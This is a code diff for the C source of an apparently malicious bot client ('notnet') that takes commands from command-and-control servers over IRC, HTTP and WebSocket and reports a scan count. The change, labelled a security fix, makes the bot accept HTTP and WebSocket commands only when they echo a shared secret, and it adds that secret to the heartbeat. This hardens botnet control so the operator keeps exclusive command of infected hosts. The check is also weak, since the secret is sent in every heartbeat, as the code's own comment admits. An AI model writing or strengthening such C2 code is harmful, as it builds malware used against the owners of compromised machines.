@@ -335,6 +335,39 @@ void irc_disconnect(notnet_bot_t *bot) {
 }
 
 /* ── HTTP Implementation ───────────────────────────────────────── */
+/* SECURITY FIX (#35): Verify a C2 response body echoes the shared
+ * secret. The bot only trusts command JSON that contains a "secret"
+ * field equal to bot->secret — a MITM who can observe the heartbeat
+ * can read the secret, but cannot inject commands the bot will trust
+ * without also being able to observe the secret echo in real time.
+ * Whitespace around the colon is tolerated. Returns 1 if the body
+ * carries the secret, 0 otherwise. */
+static int http_body_has_secret(notnet_bot_t *bot, const char *body) {
+    if (!bot || !body || bot->secret[0] == '\0') return 0;
+    const char *key = strstr(body, "\"secret\"");
+    while (key) {
+        const char *p = key + strlen("\"secret\"");
+        while (*p == ' ' || *p == '\t') p++;
+        if (*p == ':') {
+            p++;
+            while (*p == ' ' || *p == '\t') p++;
+            if (*p == '"') {
+                const char *val = p + 1;
+                const char *end = strchr(val, '"');
+                if (end) {
+                    size_t vlen = (size_t)(end - val);
+                    if (vlen == strlen(bot->secret) &&
+                        strncmp(val, bot->secret, vlen) == 0) {
+                        return 1;
+                    }
+                }
+            }
+        }
+        key = strstr(p, "\"secret\"");
+    }
+    return 0;
+}
+
 int http_connect(notnet_bot_t *bot) {
     if (bot->c2_http.connected) return 0;
     
@@ -1378,6 +1411,13 @@ int protocol_process_commands(notnet_bot_t *bot) {
             char *body = strstr(http_buf, "\r\n\r\n");
             if (body) body += 4;
             else body = http_buf;
+            /* SECURITY FIX (#35): Auth gate — only trust command JSON
+             * that echoes our shared secret. HTTP previously queued any
+             * command found in the response with no authentication
+             * (CWE-306), unlike the IRC nick allowlist. */
+            if (!http_body_has_secret(bot, body)) {
+                log_warn("HTTP: command rejected — response did not echo shared secret");
+            } else {
             /* Parse JSON command from response body only */
             char *cmd_key = strstr(body, "\"cmd\"");
             if (cmd_key) {
@@ -1421,6 +1461,7 @@ int protocol_process_commands(notnet_bot_t *bot) {
                     }
                 }
             }
+            } /* end else (secret verified) */
         }
     }
     
@@ -1428,9 +1469,15 @@ int protocol_process_commands(notnet_bot_t *bot) {
     if (bot->c2_ws.connected) {
         int result = ws_read(bot, ws_buf, sizeof(ws_buf));
         if (result > 0) {
-            if (bot->cmd_count < 256) {
-                snprintf(bot->cmd_queue[bot->cmd_count], 256, "%.255s", ws_buf);
-                bot->cmd_count++;
+            /* SECURITY FIX (#35): Same auth gate as HTTP — only trust
+             * frames that echo the shared secret. */
+            if (http_body_has_secret(bot, ws_buf)) {
+                if (bot->cmd_count < 256) {
+                    snprintf(bot->cmd_queue[bot->cmd_count], 256, "%.255s", ws_buf);
+                    bot->cmd_count++;
+                }
+            } else {
+                log_warn("WS: command rejected — frame did not echo shared secret");
             }
         }
     }
@@ -1847,10 +1894,14 @@ int protocol_send_heartbeat(notnet_bot_t *bot) {
     json_escape(bot->hostname, safe_hostname, sizeof(safe_hostname));
 
     /* SECURITY FIX (#16): Increase buffer for escaped hostname */
+    char safe_secret[64];
+    json_escape(bot->secret, safe_secret, sizeof(safe_secret));
+
     char heartbeat[1024];
     int ret = snprintf(heartbeat, sizeof(heartbeat),
-        "{\"cmd\":\"status\",\"version\":\"%s\",\"hostname\":\"%s\",\"uptime\":%ld,\"scan_count\":%u}",
-        NOTNET_VERSION, safe_hostname, (long)(time(NULL) - bot->uptime), bot->scan_count);
+        "{\"cmd\":\"status\",\"version\":\"%s\",\"hostname\":\"%s\",\"uptime\":%ld,\"scan_count\":%u,\"secret\":\"%s\"}",
+        NOTNET_VERSION, safe_hostname, (long)(time(NULL) - bot->uptime), bot->scan_count,
+        safe_secret);
     if (ret < 0 || (size_t)ret >= sizeof(heartbeat)) {
         log_warn("Heartbeat truncated: need %d bytes, buffer %zu", ret, sizeof(heartbeat));
     }
@@ -2209,6 +2260,26 @@ int load_config(notnet_bot_t *bot, const char *path) {
         } else if (strcmp(key, "irc_pass") == 0) {
             strncpy(bot->c2_irc.pass, value, 63);
             bot->c2_irc.pass[63] = '\0';
+        } else if (strcmp(key, "c2_secret") == 0) {
+            /* SECURITY FIX (#35): Shared secret for HTTP/WS command auth.
+             * Restrict to alphanumeric so the response-echo check is
+             * unambiguous (no JSON escaping needed in the needle). */
+            int valid = 1;
+            for (const char *p = value; *p; p++) {
+                if (!((*p >= 'a' && *p <= 'z') || (*p >= 'A' && *p <= 'Z') ||
+                      (*p >= '0' && *p <= '9'))) {
+                    valid = 0;
+                    break;
+                }
+            }
+            if (valid && value[0] != '\0') {
+                strncpy(bot->secret, value, sizeof(bot->secret) - 1);
+                bot->secret[sizeof(bot->secret) - 1] = '\0';
+                log_info("C2: shared secret configured (%zu chars)",
+                         strlen(bot->secret));
+            } else {
+                log_warn("C2: c2_secret rejected — use alphanumeric only");
+            }
         } else if (strcmp(key, "irc_auth_nicks") == 0) {
             /* SECURITY FIX (#5): Comma-separated authorized C2 operator nicks.
              * Only PRIVMSGs from these nicks will be processed as commands. */
